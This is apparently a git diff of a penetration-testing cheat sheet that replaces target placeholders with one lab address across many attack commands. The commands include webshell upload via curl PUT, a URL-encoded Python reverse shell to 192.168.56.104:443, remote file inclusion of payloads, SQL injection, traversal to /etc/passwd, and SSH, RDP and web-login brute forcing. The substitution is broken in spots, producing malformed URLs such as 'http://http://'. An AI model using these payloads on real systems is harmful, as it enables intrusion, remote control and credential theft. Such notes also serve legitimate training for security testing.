-./smtp-user-enum.pl -D *target* -M RCPT -U users.txt -t *target*
+./smtp-user-enum.pl -D 10.10.10.149 -M RCPT -U users.txt -t 10.10.10.149
 
 ```
 insert smtp scan here
@@ -978,9 +1291,9 @@ insert smtp scan here
 
 ### Email Harvesting
 
-theharvester -d *target-domain* -b google >google.txt
+theharvester -d http://10.10.10.149/ -b google >google.txt
 
-theharvester -d *target-domain* -l 10 -b bing >bing.txt
+theharvester -d http://10.10.10.149/ -l 10 -b bing >bing.txt
 
 ### PORT 53 DNS
 
@@ -1022,7 +1335,7 @@ Located in viper
 
 ```
 Find the DNS servers for the LAB Domain
-1.	Host -I thinc.local *target*
+1.	Host -I thinc.local 10.10.10.149
 2.	host -t ns megacorpone.com
 3.	host -t mx megacorpone.com
 4.	find / -name dns.txt
@@ -1030,25 +1343,25 @@ a.	/usr/share/dnsenum/dns.txt
 5.	modified my ./forward.sh script
 6.	host master.thinc ipaddress
 7.	host slave.thinc ipaddress
-8.	host -t axfr thinc.local *target*
+8.	host -t axfr thinc.local 10.10.10.149
 9.	Use dnsrecon to attempt a zone transfer
-10.	dnsrecon -d thinc.local -n *target* 0 -t afxr
-11.	dnsrecon -d thinc.local -n *target* -a
+10.	dnsrecon -d thinc.local -n 10.10.10.149 0 -t afxr
+11.	dnsrecon -d thinc.local -n 10.10.10.149 -a
 ```
 
 ### dnsdict6 will help enumerate ipv6 dns names
 
 ### fierce
 
-Fierce -dns *target-domain* -threads 3
+Fierce -dns http://10.10.10.149/ -threads 3
 
 ### nmap dns zone transfers
 
-nmap --script=dns-zone-transfer -p 53 *target-domain*
+nmap --script=dns-zone-transfer -p 53 http://10.10.10.149/
 
 #### nmap dns brute scan
 
-nmap -p 80 --script dns-brute.nse *target-domain*
+nmap -p 80 --script dns-brute.nse http://10.10.10.149/
 
 ### Port 69 - UDP - TFTP
 
@@ -1056,10 +1369,10 @@ This is used for tftp-server.
 
 TFTP port 69 open 
 o	TFTP Enumeration 
-o	tftp *target* PUT local_file 
-o	tftp *target* GET conf.txt (or other files) 
+o	tftp 10.10.10.149 PUT local_file 
+o	tftp 10.10.10.149 GET conf.txt (or other files) 
 o	Solarwinds TFTP server 
-o	tftp - i *target* GET /etc/passwd (old Solaris) 
+o	tftp - i 10.10.10.149 GET /etc/passwd (old Solaris) 
 TFTP Bruteforcing 
 o	TFTP bruteforcer 
 o	Cisco-Torch 
@@ -1089,8 +1402,8 @@ o	finger @internal@external
 
 ### Port 80 / 8080 - Web server
 
-- IP-address: *target*
-- Domain-name address: *target-domain*
+- IP-address: 10.10.10.149
+- Domain-name address: http://10.10.10.149/
 - Server: *web-server*
 - Scripting language: *scripting*
 - Web server modules: *web-modules*
@@ -1107,7 +1420,7 @@ before jumping into the web application, let's check the headers from the web se
 
 #### Nmap scan http headers
 
-nmap --script http-headers *target* or *target-domain*
+nmap --script http-headers 10.10.10.149 or http://10.10.10.149/
 
 ```
 incert nmap http-header-info
@@ -1116,7 +1429,7 @@ incert nmap http-header-info
 example: of getting header information
 
 ```
-root@kali:~# curl -i *target*
+root@kali:~# curl -i 10.10.10.149
 ```
 
 ```
@@ -1133,23 +1446,23 @@ INSERTCURLHEADER
 ```
 
 ```
-curl  -L *target* | grep "title\|href" | sed -e 's/^[[:space:]]*//'
+curl  -L 10.10.10.149 | grep "title\|href" | sed -e 's/^[[:space:]]*//'
 ```
 In case you have to follow a redirect
 
 ```
-curl -i -L *target*
+curl -i -L 10.10.10.149
 ```
 
 #### Scrape the site once you login again
 
 ```
-curl -u user:pass -o outfile https://*target*
+curl -u user:pass -o outfile https://10.10.10.149
 ```
 
 
 
-- domain name or target index page: http://*target-domain*
+- domain name or target index page: http://http://10.10.10.149/
 - Web application (ex, wordpress, joomla, phpmyadmin)
 - Server type or name:
 - Version:
@@ -1159,21 +1472,21 @@ curl -u user:pass -o outfile https://*target*
 #### See what the web page renders like
 
 ```
-curl  -L *target-domain*/index.php,html* | html2text -width '99' | uniq
+curl  -L http://10.10.10.149//index.php,html* | html2text -width '99' | uniq
 
 ```
 
 look for the changelog if you can. Spider the host if you need to find it
 
 ```
-curl *target-domain*/readme.md
+curl http://10.10.10.149//readme.md
 ```
 
 look for every other file
 
 #### curl the options
 
-curl -v -X OPTIONS http://*target*
+curl -v -X OPTIONS http://10.10.10.149
 
 ### Clone Website
 
@@ -1188,7 +1501,7 @@ curl -v -X OPTIONS http://*target*
 
 ### wget
 
-wget -r http://*target-domain*
+wget -r http://http://10.10.10.149/
 
 ### Nikto
 
@@ -1196,13 +1509,13 @@ nikto --version
 
 nikto -update
 
-nikto -h http://*target*
+nikto -h http://10.10.10.149
 
 ##### Nikto with non standard port
 
-nikto -h http://*target* -p 9999 *port number*
+nikto -h http://10.10.10.149 -p 9999 *port number*
 
-nikto -h *target* -output nikto-results.xml
+nikto -h 10.10.10.149 -output nikto-results.xml
 
 convert results to html
 
@@ -1217,7 +1530,7 @@ nikto -list-plugins
 
 ### Nikto Tunning
 
-nikto -h http://*target* -Tuning=1
+nikto -h http://10.10.10.149 -Tuning=1
 
 ##### Nikto tuning options 
 
@@ -1253,7 +1566,7 @@ webmail
 save it as 'rootdirs.txt' we can scan for these directories using the dictionary plugin and the following command: 
 
 
-nikto.pl -h *target* -Plugins "dictionary(dictionary:rootdirs.txt)"
+nikto.pl -h 10.10.10.149 -Plugins "dictionary(dictionary:rootdirs.txt)"
 
 ```
 INSERTNIKTOSCAN
@@ -1265,7 +1578,7 @@ This will show any of the directories identified from our rootdirs.txt file. In 
 ### you must re-run nikto against the directory
 
 
-perl nikto.pl -h *target-domain*drupal
+perl nikto.pl -h http://10.10.10.149/drupal
 
 ```
 INSERTNIKTOSCAN
@@ -1277,7 +1590,7 @@ INSERTNIKTOSCAN
 
 perl nikto.pl -display V
 
-nikto -Display V -h *target-domain*
+nikto -Display V -h http://10.10.10.149/
 
 ```
 INSERTNIKTOSCAN
@@ -1287,7 +1600,7 @@ INSERTNIKTOSCAN
 
 ### nikto with SQL injection
 
-nikto -Tuning 9 -h *target-domain*
+nikto -Tuning 9 -h http://10.10.10.149/
 
 ```
 INSERTNIKTOSCAN
@@ -1297,7 +1610,7 @@ INSERTNIKTOSCAN
 ### nikto Scan for multiple test using
 
 
-nikto -Tuning 69 -h *target-domain*
+nikto -Tuning 69 -h http://10.10.10.149/
 
 ```
 INSERTNIKTOSCAN
@@ -1315,7 +1628,7 @@ INSERTNIKTOSCAN
 
 ### nikto perform an SQL injection test and save results to an html file with verbose output for your terminal:
 
-nikto -Display V -o results.html -Format htm -Tuning 9 -h *target-domain*
+nikto -Display V -o results.html -Format htm -Tuning 9 -h http://10.10.10.149/
 
 ```
 INSERTNIKTOSCAN
@@ -1325,7 +1638,7 @@ INSERTNIKTOSCAN
 ### Nikto with squid proxy
 
 
-nikto -h *target* -useproxy http://INSERTIPADDRESS:4444
+nikto -h 10.10.10.149 -useproxy http://INSERTIPADDRESS:4444
 
 ```
 INSERTNIKTOSCAN
@@ -1334,7 +1647,7 @@ INSERTNIKTOSCAN
 
 ### uniscan
 
-uniscan-u http://*target* -qweds
+uniscan-u http://10.10.10.149 -qweds
 
 ```
 INSERTSCAN
@@ -1347,7 +1660,7 @@ Type “Uniscan-Gui”
 
 ### WHATWEB
 
-Whatweb -v *target-domain*
+Whatweb -v http://10.10.10.149/
 
 ```
 INSERTSCAN
@@ -1364,19 +1677,19 @@ nikto too for windows
 
 hxxp://nmap.org/nsedoc/scripts/http-iis-webdav-vuln.html
 
-nmap --script http-webdav-scan -p80,8080 *target*
+nmap --script http-webdav-scan -p80,8080 10.10.10.149
 
-nmap --script http-iis-webdav-vuln -p80,8080 *target*
+nmap --script http-iis-webdav-vuln -p80,8080 10.10.10.149
 
-nmap -sV --script=http-iis-webdav-vuln *target*
+nmap -sV --script=http-iis-webdav-vuln 10.10.10.149
 
 if you know the name of a password-protected folder on the system, provide it directly:
 
 or you can get a list of folders from here http://www.skullsecurity.org/blogdata/folders.lst
  
-nmap -p80,8080 --script=http-iis-webdav-vuln --script-args=webdavfolder=secret *target*
+nmap -p80,8080 --script=http-iis-webdav-vuln --script-args=webdavfolder=secret 10.10.10.149
 
-nmap -p80,8080 --script=http-iis-webdav-vuln --script-args=webdavfolder=\"my/folder/secret\" *target*
+nmap -p80,8080 --script=http-iis-webdav-vuln --script-args=webdavfolder=\"my/folder/secret\" 10.10.10.149
 
 If you provide a folder name yourself using the webdavfolder argument, you're going to have a lot more luck. As far as I know, once it has the name of a real password-protected folder, it's 100% reliable. The trick is finding one.
 
@@ -1412,29 +1725,29 @@ INSERTSCAN
 
 ### nmap test for sql injection
 
-nmap -sV  –script=http-sql-injection *target* –p 80
+nmap -sV  –script=http-sql-injection 10.10.10.149 –p 80
 
 ### Webdav
 
 ### Davtest
 
 ```
-./davtest.pl -URL http://*target*/Scripts -uploadfile /var/www/html/shell.asp.txt -uploadloc shell.asp.txt
+./davtest.pl -URL http://10.10.10.149/Scripts -uploadfile /var/www/html/shell.asp.txt -uploadloc shell.asp.txt
 ```
 
 ```
-root@kali:~/Downloads/davtest-1.0# nc *target* 80 -vv
+root@kali:~/Downloads/davtest-1.0# nc 10.10.10.149 80 -vv
 10.11.1.13: inverse host lookup failed: Unknown host
-(UNKNOWN) [*target*] 80 (http) open
+(UNKNOWN) [10.10.10.149] 80 (http) open
 COPY /Scripts/shell.asp.txt HTTP/1.1
-HOST: *target*
-Destination: http://*target*/Scripts/shell.asp
+HOST: 10.10.10.149
+Destination: http://10.10.10.149/Scripts/shell.asp
 Overwrite: T
 ```
 
 ### cadaver
 
-Cadaver http://*target*/webdav
+Cadaver http://10.10.10.149/webdav
 
 Username: wampp
 
@@ -1446,19 +1759,19 @@ Webdav> put.txt
 
 focus more on the web apps or hidden directories here
 
-curl -i *target*
+curl -i 10.10.10.149
 
 ### Get everything web
 
-curl -i -L *target*
+curl -i -L 10.10.10.149
 
 ### Check for title and all links
 
-curl *target* -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
+curl 10.10.10.149 -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
 
 ### Look at page with just text
 
-curl *target* -s -L | html2text -width '99' | uniq
+curl 10.10.10.149 -s -L | html2text -width '99' | uniq
 
 ### Check if it is possible to upload
 
@@ -1475,11 +1788,11 @@ examples are
 .exe%3b.txt
 
 ```
-curl -v -X OPTIONS http://*target*/
+curl -v -X OPTIONS http://10.10.10.149/
 
-curl -v -X PUT -d '<?php system(*dollar-sign*_GET["cmd"]); ?>' http://*target*/test/shell.php
+curl -v -X PUT -d '<?php system(*dollar-sign*_GET["cmd"]); ?>' http://10.10.10.149/test/shell.php
 
-dotdotpwn.pl -m http -h *target* -M GET -o unix
+dotdotpwn.pl -m http -h 10.10.10.149 -M GET -o unix
 
 ```
 ### identify data entry points
@@ -1540,7 +1853,7 @@ https://support.portswigger.net/customer/en/portal/articles/2590661-using-burp-t
 
 ### plecost scan
 
-plecost -n 100 -s 10 -M 15 -i /usr/share/plecost/wp_plugin_list.txt *target*/wp
+plecost -n 100 -s 10 -M 15 -i /usr/share/plecost/wp_plugin_list.txt 10.10.10.149/wp
 
 ### Url brute force
 
@@ -1549,7 +1862,7 @@ Not recursive
 ### Dirb
 
 ```
-dirb http://*target* -r -o dirb-*target*.txt
+dirb http://10.10.10.149 -r -o dirb-10.10.10.149.txt
 ```
 
 start dirbbuster gui with 
@@ -1576,29 +1889,29 @@ SecList - /usr/share/seclists/
 Example of scanning with dirb wordlists
 
 ```
-dirb http://*target*/action=/news/ /usr/share/dirbuster/wordlists/directory-list-1.0.txt
+dirb http://10.10.10.149/action=/news/ /usr/share/dirbuster/wordlists/directory-list-1.0.txt
 ```
 
 once your url brute forcing is completed you may now go back and curl specific headers from other items of interest
 example
 
 ```
-http://*target*/cgi-bin/admin.cgi
+http://10.10.10.149/cgi-bin/admin.cgi
 
-http://*target*/cgi-bin/test.cgi
+http://10.10.10.149/cgi-bin/test.cgi
 
-curl -i http://*target*/cgi-bin/admin.cgi
+curl -i http://10.10.10.149/cgi-bin/admin.cgi
 
-curl -i http://*target*/cgi-bin/admin.cgi -s | html2text
+curl -i http://10.10.10.149/cgi-bin/admin.cgi -s | html2text
 
 ```
 
 ### Nmap URL bruteforce
 
-nmap --script http-enum *target*
+nmap --script http-enum 10.10.10.149
 
 
-nmap --script -http-enum --script-args http-enum.basepath='pub/' *target*
+nmap --script -http-enum --script-args http-enum.basepath='pub/' 10.10.10.149
 
 
 ### Burp RECON
@@ -1615,16 +1928,16 @@ Send burp requests to intruder and use sniper to conduct lfi testing.
 remove relevant responde codes (403 for example)
 
 ```
-gobuster -u http://*target* -w /usr/share/seclists/Discovery/Web_Content/common.txt //
+gobuster -u http://10.10.10.149 -w /usr/share/seclists/Discovery/Web_Content/common.txt //
 -s '200,204,301,302,307,403,500' -e
 
 
-gobuster -u http://*target*/   -w /usr/share/seclists/Discovery/Web_Content/cgis.txt //
+gobuster -u http://10.10.10.149/   -w /usr/share/seclists/Discovery/Web_Content/cgis.txt //
 -s '200,204,403,500' -e
 
-gobuster -u http://*target*/ -w /usr/share/wordlists/wfuzz/general/common.txt
+gobuster -u http://10.10.10.149/ -w /usr/share/wordlists/wfuzz/general/common.txt
 
-gobuster -u http://*target-domain*/ -w /usr/share/seclists/Discovery/Web_Content/common.txt //
+gobuster -u http://http://10.10.10.149// -w /usr/share/seclists/Discovery/Web_Content/common.txt //
 -s '200,204,301,302,307,403,500' -e
 
 ```
@@ -1644,10 +1957,10 @@ https://ourcodeworld.com/articles/read/412/how-to-search-for-security-vulnerabil
 ```
 golismero --plugin-list
 
-golismero scan *target*
+golismero scan 10.10.10.149
 
-golismero scan http://*target*/wp/wp-login -e spider -e plecost -e theharvester -e exploitdb -e nmap -e nikto //
---host http://*target*/wp/ -e heartbleed -o golimreport.html
+golismero scan http://10.10.10.149/wp/wp-login -e spider -e plecost -e theharvester -e exploitdb -e nmap -e nikto //
+--host http://10.10.10.149/wp/ -e heartbleed -o golimreport.html
 ```
 
 ***Reminder*** these scans may crash the webserver and you may need to wait for a reboot of revert your lab machine at this 
@@ -1716,7 +2029,7 @@ bbqsql -h
 
 ### HTTrack
 
-httrack *target-domain* --mirror-wizard
+httrack http://10.10.10.149/ --mirror-wizard
 
 ### PAROS
 
@@ -1740,7 +2053,7 @@ from the tool menu elect analyze > click scan > view report
 
 web application security recon tool
 
-skipfish -o skipfishdata *target-domain*
+skipfish -o skipfishdata http://10.10.10.149/
 
 view report by browsing to index.html
 
@@ -1780,24 +2093,24 @@ example with the PHPmyadmin login page scanner
 
 1. type "use web/pma"
 2. then stype "show options"
-3. lastly "set *target*"
+3. lastly "set 10.10.10.149"
 4. now "run" the module
 
 ### WPScan
 
-wpscan -url *target-domain*
+wpscan -url http://10.10.10.149/
 
 --url specifiying the target, and --enumerate vp looking for vulnerabable plugins
 
-wpscan --url *target* --enumerate vp
+wpscan --url 10.10.10.149 --enumerate vp
 
-wpscan -u *target* --wordlist ~/dictionary --username *username*
+wpscan -u 10.10.10.149 --wordlist ~/dictionary --username *username*
 
 ### PARSERO
 
-Curl *target*/robots.txt -s | html2text
+Curl 10.10.10.149/robots.txt -s | html2text
 
-parsero -u *target*
+parsero -u 10.10.10.149
 
 ### Web Application (Accessing The Source Code)
 
@@ -1808,9 +2121,9 @@ one of the key files we see is called "/README.md".
 Go to the github site and find the readme
 
 ```
-Curl *target*/README.md
+Curl 10.10.10.149/README.md
 
-Curl *target*/README.md | HEAD -n 40
+Curl 10.10.10.149/README.md | HEAD -n 40
 ```
 Get the version anyway possible
 
@@ -1818,9 +2131,9 @@ Get the version anyway possible
 
 example 
 ```
-http://*target*/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd  
+http://10.10.10.149/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd  
 
-http://*target*/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf 
+http://10.10.10.149/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf 
 
 ```
 
@@ -1829,7 +2142,7 @@ look through any webserver configurations to see what is disallowed
 ### use curl to request website with a different user-agent string
 
 ```
-curl -H "User-Agent:Mozilla/4.0" http://*target*:8080
+curl -H "User-Agent:Mozilla/4.0" http://10.10.10.149:8080
 ```
 ### FireFox Toolbar hackbar options
 
@@ -1847,13 +2160,13 @@ links to other pages/domains.
 
 ### Wordpress
 
-wpscan --url  https://*target*/blogblog/ --enumerate uap
+wpscan --url  https://10.10.10.149/blogblog/ --enumerate uap
 
-wpscan --url https://*target*/blogblog --wordlist /usr/share/wordlists/rockyou.txt --username john
+wpscan --url https://10.10.10.149/blogblog --wordlist /usr/share/wordlists/rockyou.txt --username john
 
 try to look for login
 
-https://*target*/blogblog/wp-login.php?action=register
+https://10.10.10.149/blogblog/wp-login.php?action=register
 
 
 
@@ -1921,7 +2234,7 @@ fimap -u ‘http://target.website.com’
 
 fimap -force-run -u “http://target.website.com/?p=2475”
 
-fimap -u "http://*target*/example.php?test="
+fimap -u "http://10.10.10.149/example.php?test="
 
 ### kadimus LFI and RFI
 
@@ -1946,7 +2259,7 @@ Located in viper-shell
 ### LFI Manual testing
 
 ```
-Netcat *target* 80
+Netcat 10.10.10.149 80
 
 <?php echo shell_exec(*dollar_sign*_GET['cmd']);?>
 
@@ -2051,12 +2364,12 @@ http://10.11.4.94/addguestbook.php?name=Test&comment=Which+lang%3&LANG=http://10
 ### use curl to put up a webshell
 
 ```
-curl -X PUT -d '<?php system(*dollar-sign*_GET["c"]);' http://*target*1.php
+curl -X PUT -d '<?php system(*dollar-sign*_GET["c"]);' http://10.10.10.1491.php
 ```
 ### use curl to put up a webshell on port 443
 
 ```
-curl "http://*target*/test/1.php?c=python+-c+%27import+socket%2csubprocess%2cos%3bs%3dsocket.socket(socket.AF_INET%2csocket.SOCK_STREAM)%3bs.connect((%22192.168.56.104%22%2c443))%3bos.dup2(s.fileno()%2c0)%3b+os.dup2(s.fileno()%2c1)%3b+os.dup2(s.fileno()%2c2)%3bp%3dsubprocess.call(%5b%22%2fbin%2fsh%22%2c%22-i%22%5d)%3b%27"
+curl "http://10.10.10.149/test/1.php?c=python+-c+%27import+socket%2csubprocess%2cos%3bs%3dsocket.socket(socket.AF_INET%2csocket.SOCK_STREAM)%3bs.connect((%22192.168.56.104%22%2c443))%3bos.dup2(s.fileno()%2c0)%3b+os.dup2(s.fileno()%2c1)%3b+os.dup2(s.fileno()%2c2)%3bp%3dsubprocess.call(%5b%22%2fbin%2fsh%22%2c%22-i%22%5d)%3b%27"
 ```
 ### kali included webshells
 
@@ -2065,7 +2378,7 @@ curl "http://*target*/test/1.php?c=python+-c+%27import+socket%2csubprocess%2cos%
 simply upload the "simple-backdoor.php file and then pass commands to it via
 
 ```
-*target*/shells/simple-backdoor.php?cmd=ls
+10.10.10.149/shells/simple-backdoor.php?cmd=ls
 ```
 Bellow are some examples of what commands could be possible with command injection via simple-backdoor.php?cmd=
 
@@ -2118,9 +2431,9 @@ you may have to upload it with special characters such as ; or other special cha
 
 ### Ordered output
 
-curl -s http://*target*/gallery.php?page=/etc/passwd
+curl -s http://10.10.10.149/gallery.php?page=/etc/passwd
 
-/root/Tools/Kadimus/kadimus -u http://*target*/example.php?page=
+/root/Tools/Kadimus/kadimus -u http://10.10.10.149/example.php?page=
 
 ### WEBSHELLS
 https://github.com/tennc/webshell/tree/master/fuzzdb-webshell/asp
@@ -2182,7 +2495,7 @@ echo shell_exec("C:\Users\ViperClient.exe");
 ```
 Then go to the website and execute the payload.php
 
-http://*target*/addguestbook.php?name=Test&comment=Which+lang%3&LANG=http://10.11.0.202/payload_execute.txt%00&Submit=Submit
+http://10.10.10.149/addguestbook.php?name=Test&comment=Which+lang%3&LANG=http://10.11.0.202/payload_execute.txt%00&Submit=Submit
 
 
 
@@ -2215,7 +2528,7 @@ curl -s --data "<?system('*dollar-sign*{*}');?>" "http://*ipaddress*/internal/ad
 I upload the exploit.php.txt using the script 11-208.sh that we just created with the following command :
 
 ```
-root@kali:/var/www# ./11-208.sh wget http://*target*/php-nc-shell.php.txt -O /tmp/php-nc-shell.php
+root@kali:/var/www# ./11-208.sh wget http://10.10.10.149/php-nc-shell.php.txt -O /tmp/php-nc-shell.php
 ```
 
 I controll that the file was upload in the /tmp/ of the target: Below we can list the /tmp file
@@ -2321,8 +2634,8 @@ hi' or 1=1--
 inject into forms
 ```
 
-Login: hi' or 1=1--  
-Pass: hi' or 1=1--  
+Login: hi' or 1=1--  
+Pass: hi' or 1=1--  
 
 ```
 
@@ -2405,7 +2718,7 @@ SELECT banner from v*dollar-sign*version
 ### Sql blind enumerations
 
 ```
-http://*target-domain*/comment.php?id=738%20union%20select%201,2,3,4,table_name,%206%20FROM%20information_schema.tables
+http://http://10.10.10.149//comment.php?id=738%20union%20select%201,2,3,4,table_name,%206%20FROM%20information_schema.tables
 
 ```
 
@@ -2422,7 +2735,7 @@ refer to sql injection book inside kindle
 ### SQLMAP
 
 ```
-sqlmap -u *target-domain* --crawl=1
+sqlmap -u http://10.10.10.149/ --crawl=1
 
 ```
 
@@ -2439,9 +2752,9 @@ sqlmap -u *target-damian*?id=738 --dbms=mysql --dump --threads=5
 ```
 ./sqlmap.py -r search-test.txt -p tfUPass
 
-sqlmap --url='*target-domain*' --threads=10 --data="username=test*&password=test&submit= Login" --passwords
+sqlmap --url='http://10.10.10.149/' --threads=10 --data="username=test*&password=test&submit= Login" --passwords
 
-sqlmap -u http://*target-domain*/index.php --method POST --data="username=abc--&password=def&submit=+Login+" --not-string="Username or Password is invalid"
+sqlmap -u http://http://10.10.10.149//index.php --method POST --data="username=abc--&password=def&submit=+Login+" --not-string="Username or Password is invalid"
 
 sqlmap -o -u "http://192.168.56.101:1337/978345210/index.php" --data="username=admin&password=pass&submit=+Login+" --method=POST --level=3 --threads=10 --dbms=MySQL --dump
 ```
@@ -2461,11 +2774,11 @@ sqlmap -o -u "192.168.236.135:1337/978345210/index.php" --data="username=admin&p
 ```
 ### Get
 
-sqlmap -u "http://*target*/index.php?id=1" --dbms=mysql
+sqlmap -u "http://10.10.10.149/index.php?id=1" --dbms=mysql
 
 ### Crawl
 
-sqlmap -u http://*target* --dbms=mysql --crawl=3
+sqlmap -u http://10.10.10.149 --dbms=mysql --crawl=3
 
 ### Sql-login-bypass
 
@@ -2522,16 +2835,16 @@ sqlmap -o -r burp-post.txt -D mysql -T user -C User,Password --dump
 
 https://github.com/mubix/shellshocker-pocs
 ls -lah /usr/share/nmap/scripts/*shellshock*
-nmap *target* -p 80 \
+nmap 10.10.10.149 -p 80 \
   --script=http-shellshock \
   --script-args uri=/cgi-bin/test.cgi --script-args uri=/cgi-bin/admin.cgi
 
 ### Shocker
 
 ```
-nmap -sV -p- --script http-shellshock *target*
+nmap -sV -p- --script http-shellshock 10.10.10.149
 
-nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls *target*
+nmap -sV -p- --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls 10.10.10.149
 
 ls -lh /usr/share/nmap/scripts/*shellshock*
 ```
@@ -2562,7 +2875,7 @@ REF: to the bruteforce tab in the web pentesters workbook.
 create a password list with cewl
 
 ```
-cewl *target-domain* -m 6 -w  /root/mega-cewl.txt 2>/dev/null
+cewl http://10.10.10.149/ -m 6 -w  /root/mega-cewl.txt 2>/dev/null
 ```
 once the password list is ready then you can create more passwords, pass it on to john the ripper for some password mangling
 
@@ -2572,7 +2885,7 @@ john --wordlist=mega-cewl.txt --rules --stdout > mega-mangled
 
 ### brute force http
 ```
-medusa -h *target-domain* -u admin -P mega-mangled -M http -n 81 -m DIR:/admin -T 30
+medusa -h http://10.10.10.149/ -u admin -P mega-mangled -M http -n 81 -m DIR:/admin -T 30
 ```
 ### COMMON USER PASSWORD PROFILER (CUPP)
 
@@ -2643,18 +2956,18 @@ crunch 10 10 -t @@@@@@0728 -o /root/birthdaywordlist.lst
 ### hydra
 
 ```
-hydra -l admin -P /root/Desktop/wordlists/500-worst-passwords.txt *target* http-get-form "/geeklog/users.php:login=^USER^&PASS^:Deny"
+hydra -l admin -P /root/Desktop/wordlists/500-worst-passwords.txt 10.10.10.149 http-get-form "/geeklog/users.php:login=^USER^&PASS^:Deny"
 
-hydra -l admin -P /root/Desktop/wordlists/rock-you.txt *target* http-get-form "/geeklog/users.php:login=^USER^&PASS^:Deny"
+hydra -l admin -P /root/Desktop/wordlists/rock-you.txt 10.10.10.149 http-get-form "/geeklog/users.php:login=^USER^&PASS^:Deny"
 
-hydra -l elliot -P ~/fsocity.dic *target* http-post-form “/wp-login.php:log=elliot&pwd=^PASS^:ERROR”
+hydra -l elliot -P ~/fsocity.dic 10.10.10.149 http-post-form “/wp-login.php:log=elliot&pwd=^PASS^:ERROR”
 
-hydra -l admin -P passwords.lst -e ns -vV *target* http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:denied"
+hydra -l admin -P passwords.lst -e ns -vV 10.10.10.149 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:denied"
 
 ```
 ### SSH Bruteforce
 
-hydra -C metasploitableuserpass.txt *target* ssh
+hydra -C metasploitableuserpass.txt 10.10.10.149 ssh
 
 ### nmap brute
 
@@ -2662,15 +2975,15 @@ nmap --script brute -Pn
 
 ### ncrack
 
-ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://*target*
+ncrack -vv --user Administrator -P /root/oscp/passwords.txt rdp://10.10.10.149
 
 ### ncrack SSH
 
-ncrack -p 22 --user root -P 500-worst-passwords.txt *target*
+ncrack -p 22 --user root -P 500-worst-passwords.txt 10.10.10.149
 
 ### medusa SSH
 
-medusa -u root -P 500-worst-passwords.txt -h *target* -M ssh
+medusa -u root -P 500-worst-passwords.txt -h 10.10.10.149 -M ssh
 
 ### burp suite brute force for HTTP logins
 
@@ -2696,11 +3009,11 @@ medusa -u root -P 500-worst-passwords.txt -h *target* -M ssh
 
 ### ncrack RDP
 
-ncrack -u administrator -P 500-worst-passwords.txt -p 3389 *target*
+ncrack -u administrator -P 500-worst-passwords.txt -p 3389 10.10.10.149
 
 ### Telnet Bruteforce
 
-hydra -C metasploitableuserpass.txt *target* telnet
+hydra -C metasploitableuserpass.txt 10.10.10.149 telnet
 
 ### Cracking hashes
 
@@ -2752,7 +3065,7 @@ nmap --script=/usr/share/nmap/scripts/pop3-ntlm-info.nse -p 110
 INSERTPOP3CONNECT
 ```
 
-telnet *target* 110
+telnet 10.10.10.149 110
 USER pelle@INSERTIPADDRESS
 PASS admin
 
@@ -2773,7 +3086,7 @@ retr 9
 ### Port 111 - Rpcbind
 
 
-rpcinfo -p *target*
+rpcinfo -p 10.10.10.149
 ```
 
 ```
@@ -2784,7 +3097,7 @@ Some versions are vulnerable.
 
 
 
-nmap *target* --script=msrpc-enum
+nmap 10.10.10.149 --script=msrpc-enum
 
 ```
 
@@ -2805,17 +3118,17 @@ Refer to pen testing red work book
 
 •	Enumeration tab
 
-C:\>net use \\*target*\IPC*dollar_sign*”” /u: “”’
+C:\>net use \\10.10.10.149\IPC*dollar_sign*”” /u: “”’
 
 this syntac connects to hidden inter process communication (IPC*dollar_sign*)cmd.exe
 
-C:\ Net Use \\*target*\ipc*dollar_sign* “” /u:””
+C:\ Net Use \\10.10.10.149\ipc*dollar_sign* “” /u:””
 
 
 
 ### ENUM4LINUX
 
-enum4linux -a *target*
+enum4linux -a 10.10.10.149
 
 ### fuzzbunch
 
@@ -2834,34 +3147,34 @@ ls -l /usr/share/nmap/scripts/smb*
 - Allows unauthenticated login:
 
 
-nmap -v -p 139, 445 --script=smb-os-discovery *target*
+nmap -v -p 139, 445 --script=smb-os-discovery 10.10.10.149
 
-nmap -v -p 139, 445 --script=smb-security-mode *target*
+nmap -v -p 139, 445 --script=smb-security-mode 10.10.10.149
 
-nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 *target*
+nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.10.10.149
 
 nmap -v -p 139, 445 --script=smb-brute.nse 10.11.1.0/24
 
-nmap -p 445 *target* --script=smb-double-pulsar-backdoor
+nmap -p 445 10.10.10.149 --script=smb-double-pulsar-backdoor
 
-nmap --script smb-check-vulns-nse *target*
+nmap --script smb-check-vulns-nse 10.10.10.149
 
-nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p445 *target*
+nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p445 10.10.10.149
 
-nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse *target* -p 445
+nmap --script=smb-enum-shares.nse,smb-ls.nse,smb-enum-users.nse,smb-mbenum.nse,smb-os-discovery.nse,smb-security-mode.nse,smbv2-enabled.nse,smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10054.nse,smb-vuln-ms10-061.nse,smb-vuln-regsvc-dos.nse,smbv2-enabled.nse 10.10.10.149 -p 445
 
 ### Enum4linux
 
-enum4linux -a *target*
+enum4linux -a 10.10.10.149
 
 enum4linux -a
 
-enum4linux -a -u root -v *target*
+enum4linux -a -u root -v 10.10.10.149
 
-enum4linux -a -u guest -v *target* >  enum4linux
